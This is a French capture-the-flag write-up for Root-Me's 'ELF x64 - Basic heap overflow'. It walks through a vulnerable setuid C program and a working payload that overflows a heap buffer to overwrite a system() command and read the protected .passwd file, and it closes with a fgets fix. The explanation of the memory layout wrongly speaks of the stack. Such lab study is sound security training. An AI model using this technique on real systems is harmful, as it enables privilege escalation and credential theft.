# L’épopée Root-Me : App - Système | ELF x64 - Basic heap overflow

## 1. Informations Générales & Configuration de l'Environnement

- **Plateforme :** Root-Me
- **Catégorie :** App - Système
- **Challenge :** ELF x64 - Basic heap overflow

| Protection | Nom complet | État |
| :--- | :--- | :---: |
| **PIE** | Position Independent Executable | [✔️] |
| **RelRO** | Read Only relocations | [✔️] |
| **NX** | Pile non exécutable | [✔️] |
| **Heap exec** | Tas non exécutable | [✔️] |
| **ASLR** | Distribution aléatoire de l'espace d'adressage | [✔️] |
| **SF** | Source Fortification | [❌] |
| **SSP** | Stack-Smashing Protection | [❌] |
| **SRC** | Accès au code source | [✔️] |

---

## 2. Analyse du Code Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void    checkArg(const char *a)
{
  while (*a)
    {
      if (   (*a == ';')
          || (*a == '&')
          || (*a == '|')
          || (*a == ',')
          || (*a == '$')
          || (*a == '(')
          || (*a == ')')
          || (*a == '{')
          || (*a == '}')
          || (*a == '`')
          || (*a == '>')
          || (*a == '<') ) {
        puts("Forbidden !!!");
        exit(2);
      }
        a++;
    }
}

int     main()
{
  char  *arg = malloc(0x20);
  char  *cmd = malloc(0x400);
  setreuid(geteuid(), geteuid());

  strcpy(cmd, "/bin/ls -l ");

  printf("Enter directory you want to display : ");

  gets(arg);
  checkArg(arg);

  strcat(cmd, arg);
  system(cmd);

  return 0;
}
```

### Le challenge :

La première étape de ce challenge va être la lecture du code. Ici, C, voici les informations notables :

- Il y a un buffer arg qui peut contenir 32 octets
- Un autre cmd pouvant en contenir 1024
- Certains caractères sont interdits
- Le programme lance ls, donc un code bash.

Une première faille semble me sauter aux yeux : Aucune vérification de la taille de l'entrée, on peut potentiellement déborder sur la mémoire allouée par malloc pour écraser la commande initiale.

---

## 3. Exploitation & Démarche de Résolution

### Étape 1 : Déroulement basique du script

Tout d'abord, on va vérifier le déroulement basique du programme :

```bash
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display : ;
Forbidden !!!
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display : 1111111111111111111111111111111
/bin/ls: cannot access '1111111111111111111111111111111': No such file or directory
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display : ^[[A^[[B^[[B^[[A^[[B^[[A^[[D^[[A^[[C^[[D^[[A^[[C^[[D^[[A^[[C^[[D^[[A^[[C^[[D^[[A^[[C^[[D^[[A^[[C^[[D^[[C^[[A^[[D^[[A^[[C
Segmentation fault
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display : 123456789012345678901234567890123
/bin/ls: cannot access '123456789012345678901234567890123': No such file or directory
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display : 111111111111111111111111111111111111111
/bin/ls: cannot access '111111111111111111111111111111111111111': No such file or directory
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display : 1111111111111111111111111111111111111111111111111111
sh: 1: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111: not found
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display : 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Segmentation fault
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display : 1111111111111111111111111111111111111111111111111111
sh: 1: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111: not found
```

On voit plusieurs cas de figures :
-Si on met quelque chose au hasard : Le programme fonctionne normalement
-Si on met ';' : Le programme interdit l'utilisation de certains caractères
-Si on met plus de caractère qu'attendu : Un segfault
ou
-Une autre commande que /bin/ls se lance


### Étape 2 : Identification de la vulnérabilité

Essayons maintenant de tester de lancer quelque chose comme 'whoami'.

```bash
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display :                                                                  whoami
whoami: extra operand ‘whoami’
Try 'whoami --help' for more information.
```
Ca a fonctionné à moitié, il semble que des arguments parasites empêche l'exécution de la commande

### Étape 3 : Analyse du comportement

On va maintenant chercher à comprendre comment ceci fonctionne. La pile suit le principe LIFO, Last In First Out. En débordant de la pile, ici un tableau statique, le dernier élément est lu. Ici, la pile est simulée par cmd, et en débordant sur la mémoire allouée par arg, on écrase le "/bin/ls -l", ici par whoami. Sauf que des arguments parasites empêche l'exécution. Mais en jetant un œil sur les caractères interdits on voit que '#' n'y est pas. Donc on peut annuler les arguments parasites en l'utilisant pour les transformer en commentaire.

### Étape 4 : Exploitation

Maintenant que nous avons trouvés une solution, nous allons essayer de lancer un whoami.

```bash
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display :                                                                   whoami #
app-systeme-ch94-cracked
```

Ca fonctionne, à partir de la tentons de trouver le flag.

```bash
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display :                                                                    ls -la #
total 40
drwxr-x---  2 app-systeme-ch94-cracked app-systeme-ch94 4096 févr. 13  2023 .
drwxr-xr-x 65 root                     root             4096 juil.  4  2024 ..
-r-sr-x---  1 app-systeme-ch94-cracked app-systeme-ch94 8680 févr. 13  2023 ch94
-r--r-----  1 app-systeme-ch94-cracked app-systeme-ch94  791 févr.  5  2023 ch94.c
-rw-r-----  1 root                     root               44 févr.  5  2023 .git
-r--r-----  1 app-systeme-ch94-cracked app-systeme-ch94  793 févr.  5  2023 Makefile
-r--------  1 app-systeme-ch94-cracked root               30 févr.  5  2023 .passwd
-r--------  1 root                     root              800 févr. 12  2023 ._perms
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display :                                                                    cat .passwd #
Segmentation fault
app-systeme-ch94@challenge03:~$ ./ch94 
Enter directory you want to display :                                                                  cat .passwd #
***************************
```

Le mot de passe est en poche.

## 4. Comment se protéger ?

Ici, l'erreur venait de gets qui ne vérifie pas la taille de l'entrée, donc on a pu déborder sur la mémoire et réécrire la commande que l'on voulait..

Pour corriger ce problème, la solution est :

Vérifier la taille, et utiliser fgets pour la limiter pour pas qu'elle dépasse la taille de la mémoire allouée.
